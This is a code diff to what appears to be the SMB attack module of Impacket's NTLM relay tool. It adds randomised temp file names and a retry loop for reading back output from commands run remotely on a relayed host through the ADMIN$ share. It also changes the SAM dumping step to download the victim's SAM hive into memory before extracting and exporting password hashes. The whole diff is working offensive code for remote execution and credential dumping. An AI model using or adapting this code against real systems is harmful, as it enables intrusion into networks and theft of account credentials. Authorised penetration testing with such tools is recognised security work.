@@ -28,10 +28,19 @@ from impacket.smbconnection import SMBConnection
 from impacket.examples.smbclient import MiniImpacketShell
 from impacket.dcerpc.v5.rpcrt import DCERPCException
 from impacket.dcerpc.v5 import samr
+import io
 import random
+import secrets
 import string
+import time
 
 PROTOCOL_ATTACK_CLASS = "SMBAttack"
+
+
+class MemoryHive(io.BytesIO):
+    """BytesIO adapter matching the open() method used by remote hive parsers."""
+    def open(self):
+        self.seek(0)
 
 class SMBAttack(ProtocolAttack):
     """
@@ -189,16 +198,47 @@ class SMBAttack(ProtocolAttack):
 
                 try:
                     if self.config.command is not None:
+                        run_id = "relay_" + secrets.token_hex(6)
+                        remote_output = "Temp\\%s.out" % run_id
+                        remoteOps._RemoteOperations__batchFile = "%%TEMP%%\\%s.bat" % run_id
+                        remoteOps._RemoteOperations__output = "%%SYSTEMROOT%%\\Temp\\%s.out" % run_id
+
                         remoteOps._RemoteOperations__executeRemote(self.config.command)
                         LOG.info("Executed specified command on host: %s", self.__SMBConnection.getRemoteHost())
-                        self.__SMBConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
-                        self.__SMBConnection.deleteFile('ADMIN$', 'Temp\\__output')
-                        print(self.__answerTMP.decode(self.config.encoding, 'replace'))
+                        for attempt in range(10):
+                            try:
+                                self.__SMBConnection.getFile('ADMIN$', remote_output, self.__answer)
+                                self.__SMBConnection.deleteFile('ADMIN$', remote_output)
+                                print(self.__answerTMP.decode(self.config.encoding, 'replace'))
+                                break
+                            except Exception as e:
+                                if 'STATUS_OBJECT_NAME_NOT_FOUND' not in str(e):
+                                    raise
+                                if attempt == 9:
+                                    LOG.warning("Command was submitted, but output file %s was not created", remote_output)
+                                    break
+                                time.sleep(1)
                     else:
                         bootKey = remoteOps.getBootKey()
                         remoteOps._RemoteOperations__serviceDeleted = True
-                        samFileName = remoteOps.saveSAM()
-                        samHashes = SAMHashes(samFileName, bootKey, isRemote = True)
+                        remoteSAM = remoteOps.saveSAM()
+
+                        # Avoid many latency-heavy random reads through SMB by
+                        # downloading only SAM sequentially and parsing locally.
+                        samBuffer = MemoryHive()
+                        remoteSAM.open()
+                        try:
+                            while True:
+                                chunk = remoteSAM.read(1024 * 1024)
+                                if not chunk:
+                                    break
+                                samBuffer.write(chunk)
+                        finally:
+                            remoteSAM.close()
+                        samBuffer.seek(0)
+                        LOG.info("Downloaded SAM hive into memory (%d bytes)", len(samBuffer.getbuffer()))
+
+                        samHashes = SAMHashes(samBuffer, bootKey, isRemote = True)
                         samHashes.dump()
                         samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                         LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
